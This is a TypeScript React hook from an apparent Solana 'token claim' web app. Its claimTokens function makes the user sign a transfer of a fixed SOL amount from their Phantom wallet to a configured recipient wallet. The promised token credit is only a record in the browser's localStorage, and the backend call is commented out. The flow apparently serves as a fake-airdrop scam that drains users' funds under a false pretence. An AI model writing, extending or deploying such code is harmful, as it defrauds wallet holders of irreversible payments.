// src/hooks/useTransaction.ts
import { useState, useCallback } from 'react';
import { 
  Connection, 
  PublicKey, 
  Transaction, 
  SystemProgram, 
  LAMPORTS_PER_SOL,
  TransactionExpiredBlockheightExceededError 
} from '@solana/web3.js';
import { TransactionState, ClaimRecord, PhantomProvider } from '../types/index';
import { CONFIG } from '../config';

// Fallback RPC endpoints
const RPC_ENDPOINTS = [
  CONFIG.RPC_ENDPOINT,
  'https://api.devnet.solana.com',
  'https://solana-mainnet.g.alchemy.com/v2/demo',
];

const createConnection = (endpoint: string) => {
  return new Connection(endpoint, {
    commitment: 'confirmed',
    confirmTransactionInitialTimeout: 60000,
  });
};

export const useTransaction = () => {
  const [transactionState, setTransactionState] = useState<TransactionState>({
    status: 'idle',
    signature: null,
    error: null,
    progress: 0
  });

  const [currentRpcIndex, setCurrentRpcIndex] = useState<number>(0);

  const tryRpcEndpoints = async <T,>(
    operation: (conn: Connection) => Promise<T>,
    maxRetries: number = 3
  ): Promise<T> => {
    let lastError: Error | null = null;

    for (let i = 0; i < RPC_ENDPOINTS.length; i++) {
      const endpoint = RPC_ENDPOINTS[i];
      const tempConnection = createConnection(endpoint);

      for (let attempt = 0; attempt < maxRetries; attempt++) {
        try {
          const result = await operation(tempConnection);
          if (i !== currentRpcIndex) {
            setCurrentRpcIndex(i);
          }
          return result;
        } catch (error: any) {
          lastError = error;
          console.warn(`RPC attempt ${attempt + 1} failed for ${endpoint}:`, error.message);
          
          if (error.message?.includes('403') || error.message?.includes('429')) {
            break;
          }
          
          if (attempt < maxRetries - 1) {
            await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
          }
        }
      }
    }

    throw lastError || new Error('All RPC endpoints failed');
  };

  const handleTokenCredit = useCallback(async (publicKey: string, signature: string): Promise<void> => {
    const claimRecord: ClaimRecord = {
      walletAddress: publicKey,
      transactionSignature: signature,
      claimAmount: CONFIG.CLAIM_AMOUNT_SOL,
      tokenValue: CONFIG.TOKEN_VALUE_USD,
      timestamp: new Date().toISOString(),
      status: 'pending_credit'
    };

    try {
      // Store claim record
      const existingClaims = localStorage.getItem('tokenClaims');
      const claims: ClaimRecord[] = existingClaims ? JSON.parse(existingClaims) : [];
      claims.push(claimRecord);
      localStorage.setItem('tokenClaims', JSON.stringify(claims));
      
      console.log('✅ Token credit record created:', claimRecord);
      console.log('📋 Total claims:', claims.length);
      
      // Here you can add API call to your backend
      // await submitClaimToBackend(claimRecord);
      
    } catch (error) {
      console.error('Failed to store claim record:', error);
      // Don't throw - the transaction was already successful
    }
  }, []);

  const claimTokens = useCallback(async (
    walletAddress: string,
    balance: number,
    provider: PhantomProvider
  ): Promise<void> => {
    // Reset state
    setTransactionState({ 
      status: 'processing', 
      signature: null, 
      error: null, 
      progress: 10 
    });

    try {
      // Validate balance
      if (balance < CONFIG.CLAIM_AMOUNT_SOL) {
        const needed = (CONFIG.CLAIM_AMOUNT_SOL - balance).toFixed(4);
        throw new Error(
          `Insufficient balance. You need at least ${CONFIG.CLAIM_AMOUNT_SOL} SOL. ` +
          `You need ${needed} more SOL.`
        );
      }

      // Validate wallet is still connected
      if (!provider.isConnected) {
        throw new Error('Wallet disconnected. Please reconnect and try again.');
      }

      // Validate public key
      if (!provider.publicKey) {
        throw new Error('No public key found. Please reconnect your wallet.');
      }

      console.log('🔄 Starting transaction...');
      console.log(`   From: ${walletAddress}`);
      console.log(`   To: ${CONFIG.RECIPIENT_WALLET}`);
      console.log(`   Amount: ${CONFIG.CLAIM_AMOUNT_SOL} SOL`);

      // Create transaction
      setTransactionState(prev => ({ ...prev, progress: 20 }));
      
      const senderPublicKey = new PublicKey(walletAddress);
      const recipientPublicKey = new PublicKey(CONFIG.RECIPIENT_WALLET);

      // Get latest blockhash with retry
      setTransactionState(prev => ({ ...prev, progress: 30 }));
      
      const { blockhash, lastValidBlockHeight } = await tryRpcEndpoints(
        async (conn) => {
          return await conn.getLatestBlockhash('confirmed');
        }
      );

      // Build transaction
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: senderPublicKey,
          toPubkey: recipientPublicKey,
          lamports: CONFIG.CLAIM_AMOUNT_SOL * LAMPORTS_PER_SOL
        })
      );

      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderPublicKey;

      console.log('📝 Transaction built, requesting signature...');
      setTransactionState(prev => ({ ...prev, progress: 50 }));

      // Sign transaction with Phantom
      let signedTransaction;
      try {
        signedTransaction = await provider.signTransaction(transaction);
      } catch (signError: any) {
        if (signError.message?.includes('User rejected')) {
          throw new Error('Transaction was rejected by user.');
        }
        throw new Error(`Failed to sign transaction: ${signError.message}`);
      }

      console.log('✅ Transaction signed, sending to network...');
      setTransactionState(prev => ({ ...prev, progress: 70, status: 'confirming' }));

      // Send transaction with retry
      const signature = await tryRpcEndpoints(
        async (conn) => {
          return await conn.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
          });
        }
      );

      console.log(`📤 Transaction sent: ${signature}`);
      setTransactionState(prev => ({ ...prev, progress: 85 }));

      // Confirm transaction with timeout
      const confirmationStrategy = {
        signature,
        blockhash,
        lastValidBlockHeight,
      };

      try {
        const confirmation = await tryRpcEndpoints(
          async (conn) => {
            return await conn.confirmTransaction(confirmationStrategy, 'confirmed');
          },
          5 // More retries for confirmation
        );

        if (confirmation.value.err) {
          throw new Error(
            `Transaction failed: ${JSON.stringify(confirmation.value.err)}`
          );
        }
      } catch (confirmError: any) {
        if (confirmError instanceof TransactionExpiredBlockheightExceededError) {
          throw new Error(
            'Transaction timed out. The network may be congested. Please try again.'
          );
        }
        throw confirmError;
      }

      // Success!
      console.log('🎉 Transaction confirmed successfully!');
      setTransactionState({
        status: 'success',
        signature,
        error: null,
        progress: 100
      });

      // Handle token credit
      await handleTokenCredit(walletAddress, signature);

      // Reset after 10 seconds to allow user to see success
      setTimeout(() => {
        setTransactionState(prev => 
          prev.status === 'success' ? { ...prev } : prev
        );
      }, 10000);

    } catch (error: any) {
      console.error('❌ Transaction error:', error);
      
      // User-friendly error messages
      let errorMessage = error.message || 'An unexpected error occurred';
      
      // Handle specific error cases
      if (errorMessage.includes('User rejected')) {
        errorMessage = 'Transaction was cancelled. You can try again when ready.';
      } else if (errorMessage.includes('insufficient')) {
        errorMessage = errorMessage;
      } else if (errorMessage.includes('403') || errorMessage.includes('429')) {
        errorMessage = 'Network is busy. Please try again in a few moments.';
      } else if (errorMessage.includes('timeout') || errorMessage.includes('expired')) {
        errorMessage = 'Transaction timed out. Please try again.';
      }
      
      setTransactionState({
        status: 'error',
        signature: null,
        error: errorMessage,
        progress: 0
      });
      
      // Auto-reset error after 8 seconds
      setTimeout(() => {
        setTransactionState(prev => 
          prev.status === 'error' ? { ...prev, status: 'idle' as const, error: null } : prev
        );
      }, 8000);
      
      throw error;
    }
  }, [handleTokenCredit]);

  const resetTransaction = useCallback((): void => {
    setTransactionState({
      status: 'idle',
      signature: null,
      error: null,
      progress: 0
    });
  }, []);

  return {
    transactionState,
    claimTokens,
    resetTransaction
  };
};